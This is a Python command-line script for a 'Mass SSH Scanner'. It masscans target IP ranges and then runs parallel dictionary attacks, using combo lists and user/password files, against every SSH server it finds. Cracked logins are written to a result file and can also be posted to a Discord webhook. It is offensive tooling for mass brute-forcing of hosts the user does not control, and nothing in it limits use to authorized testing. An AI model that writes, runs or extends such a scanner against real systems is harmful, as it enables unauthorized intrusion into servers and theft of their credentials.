import argparse
import datetime
from scanner.masscan import Masscan
from _ssh.ssh_client import SSH_Client


if "__main__" == __name__:
    parser = argparse.ArgumentParser(description="A Mass SSH Scanner")
    parser.add_argument(
        "--targets",
        type=str,
        default="./targets.txt",
        help="A path to targets file (default is targets.txt)",
    )
    parser.add_argument(
        "--max-rate",
        type=str,
        default="1000",
        help="Max rate of packets per second (default is 1000)",
    )
    parser.add_argument(
        "--disable-combo",
        action="store_false",
        default=True,
        help="If combo will be used to dictionary attack",
    )
    parser.add_argument(
        "--disable-user-pass",
        action="store_false",
        default=True,
        help="If user:pass from user.txt and password.txt will be used to dictionary attack",
    )
    parser.add_argument(
        "--worker-size",
        type=int,
        default=50,
        help="Worker size for dictionary attacking (default is 50)",
    )
    parser.add_argument(
        "--disable-output",
        action="store_false",
        default=True,
        help="output (default is True)",
    )
    parser.add_argument(
        "--error-verbose",
        action="store_true",
        default=False,
        help="error verbose (default is True)",
    )
    parser.add_argument(
        "--discord-webhook",
        type=str,
        default="",
        help="discord webhook to send hit notification",
    )

    args = parser.parse_args()

    timestamp = datetime.datetime.now().isoformat()

    targets = []
    with open(args.targets, "r") as f:
        for i in f.readlines():
            i = i.split(":")
            _d = {"ip": i[0], "port": i[1]}
            targets.append(_d)

    for target in targets:
        print(f"Masscanning {target["ip"]}:{target["port"]}")
        ips = Masscan.scan(target["ip"], target["port"], args.max_rate)

        print(f"{len(ips)} found. Skipping...")
        if len(ips) == 0:
            continue

        for i in ips:
            ssh_client = SSH_Client(i["ip"], target["port"], args.error_verbose)
            ssh_client.dictionary_attack(
                is_combo_enabled=args.disable_combo,
                is_user_pass_enabled=args.disable_user_pass,
                worker_size=args.worker_size,
            )

            if args.disable_output:
                if ssh_client.result is not None:
                    with open(f"result_{timestamp}.txt", "a") as file:
                        file.write(ssh_client.result + "\n")

            print(f"Done: {i}:{target["port"]}")
